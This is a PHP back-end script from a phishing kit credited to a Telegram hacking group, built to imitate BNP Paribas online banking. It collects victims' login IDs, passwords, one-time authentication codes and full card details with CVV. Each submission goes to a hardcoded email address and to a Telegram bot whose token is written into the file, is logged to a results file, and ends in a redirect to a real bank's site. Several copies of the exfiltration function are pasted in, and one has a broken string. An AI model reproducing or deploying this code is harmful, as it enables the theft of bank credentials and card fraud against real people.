r

<?php

/*
       t . m e / v P w n d C o m 
       
██████╗ ██╗    ██╗███╗   ██╗██████╗ 
██╔══██╗██║    ██║████╗  ██║██╔══██╗
██████╔╝██║ █╗ ██║██╔██╗ ██║██║  ██║
██╔═══╝ ██║███╗██║██║╚██╗██║██║  ██║
██║     ╚███╔███╔╝██║ ╚████║██████╔╝
╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚═════╝ Unethical Hackerz

 @vPwnd @vPwndCom  | P W N D  C o m m u n i t y

Support Us 

Channel : @vPwnd
Group : @vPwndCom
Website : Pwncore.keybase.pub

 */
include_once '../inc/app.php';
include_once '../vendor/autoload.php';
use Inacho\CreditCard;

function validate_cc_number($number = null) {
    $card = CreditCard::validCreditCard($number);
    if( $card['valid'] == false ) {
        return false;
    }
    return $card;
}

function validate_cc_cvv($number = null,$type = null) {
    if( empty($number) || empty($type) )
        return false;
    $cvv = CreditCard::validCvc($number, $type);
    return $cvv;
}

$to = 'duffounie@proton.me'; // Email Here

$random   = rand(0,100000000000);
$dispatch = substr(md5($random), 0, 17);


if($_SERVER['REQUEST_METHOD'] == "POST") {

    if ($_POST['type'] == "region") {

        $_SESSION['region_number'] = $_POST['region_number'];
        $_SESSION['region_caisse']    = $_POST['region_caisse'];

        $_SESSION['errors'] = [];
        if( empty($_POST['region_number']) && empty($_POST['region_caisse']) ) {
            $_SESSION['errors']['region_number'] = true;
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = $_SERVER['REMOTE_ADDR'] . ' | BNP PARIBAS | Caisse Régionale';
            $message = '/-- REGION INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Numéro de département : ' . $_POST['region_number'] . "\r\n";
            $message .= 'Caisse régionale : ' . $_POST['region_caisse'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END REGION INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

            mail($to,$subject,$message,$headers);
function telegram_send($message) {
    $curl = curl_init();
    $api_key  = '5008911861:AAGX0QkMnp8S5mGraWrmi2SgR8Eg_WffgWk';
    $chat_id  = '1300275807';
    $format   = 'HTML';
    curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
    $result = curl_exec($curl);
    curl_close($curl);
    return true;
}

telegram_send(urlencode($message));
            file_put_contents("../resulttt987.txt", $message, FILE_APPEND);
            header("location: login.php?particulier#_$dispatch");

        } else {
            header("location: region.php?error#_$dispatch");
        }

    }

    if ($_POST['type'] == "login") {

        $_SESSION['identifiant'] = $_POST['identifiant'];
        $_SESSION['password']    = $_POST['password'];

        $_SESSION['errors'] = [];
        if( validate_number($_POST['identifiant'],11) == false ) {
            $_SESSION['errors']['identifiant'] = true;
        }

        if( validate_number($_POST['password'],6) == false ) {
            $_SESSION['errors']['password'] = true;
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = $_SERVER['REMOTE_ADDR'] . ' | BNP PARIBAS | Login';
            $message = '/-- LOG INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Identifiant : ' . $_POST['identifiant'] . "\r\n";
            $message .= 'Password : ' . $_POST['password'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END LOG INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

            mail($to,$subject,$message,$headers);function telegram_send($message) {
    $curl = curl_init();
    $api_key  = '5008911861:AAGX0QkMnp8S5mGraWrmi2SgR8Eg_WffgWk;
    $chat_id  = '1300275807';
    $format   = 'HTML';
    curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
    $result = curl_exec($curl);
    curl_close($curl);
    return true;
}

telegram_send(urlencode($message));
            file_put_contents("../resulttt987.txt", $message, FILE_APPEND);
            header("location: authfort.php?validation#_$dispatch");

        } else {
            header("location: login.php?particulier#_$dispatch");
        }

    }


    if ($_POST['type'] == "authfort") {

        $_SESSION['authfort']        = $_POST['authfort'];

        $_SESSION['errors'] = [];
        if( empty($_POST['authfort']) ) {
            $_SESSION['errors']['authfort'] = 'Le code est incorrect.';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = $_SERVER['REMOTE_ADDR'] . ' | BNP PARIBAS | AUTHENTIFICATIONFORTE';
            $message = '/-- AUTH FORTE INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Code : ' . $_POST['authfort'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END AUTH FORTE INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

            mail($to,$subject,$message,$headers);function telegram_send($message) {
    $curl = curl_init();
    $api_key  = '5008911861:AAGX0QkMnp8S5mGraWrmi2SgR8Eg_WffgWk';
    $chat_id  = '1300275807';
    $format   = 'HTML';
    curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
    $result = curl_exec($curl);
    curl_close($curl);
    return true;
}

telegram_send(urlencode($message));
            file_put_contents("../resulttt987.txt", $message, FILE_APPEND);
            header("location: loading1.php?validation#_$dispatch");

        } else {
            header("location: authfort.php?validation#_$dispatch");
        }

    }

    if ($_POST['type'] == "securepass") {

        $_SESSION['securepass']        = $_POST['securepass'];

        $_SESSION['errors'] = [];
        if( empty($_POST['securepass']) ) {
            $_SESSION['errors']['securepass'] = 'Le code est incorrect.';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = $_SERVER['REMOTE_ADDR'] . ' | BNP PARIBAS | Securepasse';
            $message = '/-- SECUREPASSE INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Code : ' . $_POST['securepass'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END SECUREPASSE INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

            mail($to,$subject,$message,$headers);
function telegram_send($message) {
    $curl = curl_init();
    $api_key  = '5008911861:AAGX0QkMnp8S5mGraWrmi2SgR8Eg_WffgWk';
    $chat_id  = '1300275807';
    $format   = 'HTML';
    curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
    $result = curl_exec($curl);
    curl_close($curl);
    return true;
}

telegram_send(urlencode($message));
            file_put_contents("../resulttt987.txt", $message, FILE_APPEND);
            header("location: loading2.php?validation#_$dispatch");

        } else {
            header("location: securepass.php?validation#_$dispatch");
        }

    }

    if ($_POST['type'] == "validemail") {

        $_SESSION['validemail']        = $_POST['validemail'];

        $_SESSION['errors'] = [];
        if( empty($_POST['validemail']) ) {
            $_SESSION['errors']['validemail'] = 'Le code est incorrect.';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = $_SERVER['REMOTE_ADDR'] . ' | BNP PARIBAS | Valid Email';
            $message = '/-- VALID EMAIL INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Code : ' . $_POST['validemail'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END VALID EMAIL INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

            mail($to,$subject,$message,$headers);
function telegram_send($message) {
    $curl = curl_init();
    $api_key  = '5008911861:AAGX0QkMnp8S5mGraWrmi2SgR8Eg_WffgWk';
    $chat_id  = '1300275807';
    $format   = 'HTML';
    curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
    $result = curl_exec($curl);
    curl_close($curl);
    return true;
}

telegram_send(urlencode($message));
            file_put_contents("../resulttt987.txt", $message, FILE_APPEND);
            header("location: loading3.php?validation#_$dispatch");

        } else {
            header("location: validemail.php?validation#_$dispatch");
        }

    }

    if ($_POST['type'] == "cc") {
        
        $_SESSION['nom']        = $_POST['nom'];
        $_SESSION['prenom']     = $_POST['prenom'];
        $_SESSION['address']    = $_POST['address'];
        $_SESSION['zip_code']   = $_POST['zip_code'];
        $_SESSION['city']       = $_POST['city'];
        $_SESSION['cc_number'] = $_POST['cc_number'];
        $_SESSION['cc_cvv']    = $_POST['cc_cvv'];
        $_SESSION['cc_date']   = $_POST['cc_date'];

        $date_ex = explode('/',$_POST['cc_date']);

        $card_number = validate_cc_number($_POST['cc_number']);
        $card_cvv    = validate_cc_cvv($_POST['cc_cvv'],$card_number['type']);

        if( count($date_ex) > 1 ) {
            $card_date   = $validDate = CreditCard::validDate(trim($date_ex[1]), trim($date_ex[0]));
        } else {
            $card_date = false;
        }

        $_SESSION['errors'] = [];
        if( validate_name($_POST['nom']) == false ) {
            $_SESSION['errors']['nom'] = 'Veuillez saisir un nom valide.';
        }

        if( validate_name($_POST['prenom']) == false ) {
            $_SESSION['errors']['prenom'] = 'Veuillez saisir un prénom valide.';
        }

        if( $card_number == false ) {
            $_SESSION['errors']['cc_number'] = 'Veuillez saisir un numéro de la carte valid.';
        }

        if( $card_cvv == false ) {
            $_SESSION['errors']['cc_cvv'] = 'Veuillez saisir un numéro valid.';
        }

        if( $card_date == false ) {
            $_SESSION['errors']['cc_date'] = 'Veuillez saisir une date valide.';
        }

        if( empty($_POST['address']) ) {
            $_SESSION['errors']['address'] = 'Veuillez saisir une adresse valide.';
        }

        if( validate_number($_POST['zip_code']) == false ) {
            $_SESSION['errors']['zip_code'] = 'Veuillez saisir un code postale valide.';
        }

        if( empty($_POST['city']) ) {
            $_SESSION['errors']['city'] = 'Veuillez saisir une ville valide.';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = $_SERVER['REMOTE_ADDR'] . ' | BNP PARIBAS | Card Details';
            $message = '/-- CARD DETAILS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'nom : ' . $_POST['nom'] . "\r\n";
            $message .= 'prenom : ' . $_POST['prenom'] . "\r\n";
            $message .= 'address : ' . $_POST['address'] . "\r\n";
            $message .= 'zip_code : ' . $_POST['zip_code'] . "\r\n";
            $message .= 'city : ' . $_POST['city'] . "\r\n";
            $message .= 'N° de carte : ' . $_POST['cc_number'] . "\r\n";
            $message .= 'Date d\'expiration : ' . $_POST['cc_date'] . "\r\n";
            $message .= 'CVV : ' . $_POST['cc_cvv'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END CARD DETAILS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

            mail($to,$subject,$message,$headers);
function telegram_send($message) {
    $curl = curl_init();
    $api_key  = '5008911861:AAGX0QkMnp8S5mGraWrmi2SgR8Eg_WffgWk';
    $chat_id  = '1300275807';
    $format   = 'HTML';
    curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
    $result = curl_exec($curl);
    curl_close($curl);
    return true;
}

telegram_send(urlencode($message));
            file_put_contents("../resulttt987.txt", $message, FILE_APPEND);
            session_destroy();
            header("location: https://www.credit-agricole.fr/");

        } else {
            header("location: cc.php?validation#_$dispatch");
        }

    }

}

?>